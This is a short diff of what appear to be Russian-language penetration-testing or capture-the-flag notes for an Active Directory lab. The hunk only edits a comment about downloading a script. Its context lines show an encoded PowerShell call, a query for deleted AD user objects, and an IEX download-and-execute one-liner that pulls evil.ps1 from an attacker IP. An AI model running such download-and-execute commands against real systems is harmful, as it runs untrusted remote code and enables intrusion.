@@ -27,6 +27,6 @@ powershell -enc (вывод)
 
 Get-ADObject -SearchBase "CN=Deleted Objects,DC=Cascade,DC=Local" -Filter {ObjectClass -eq "user"} -IncludeDeletedObjects -Properties *
 
-# Загрузка скрипта
+# Загрузка скрипта и выполнение
 
 IEX(New-Object Net.WebClient).downloadString('http://10.10.14.4/evil.ps1')
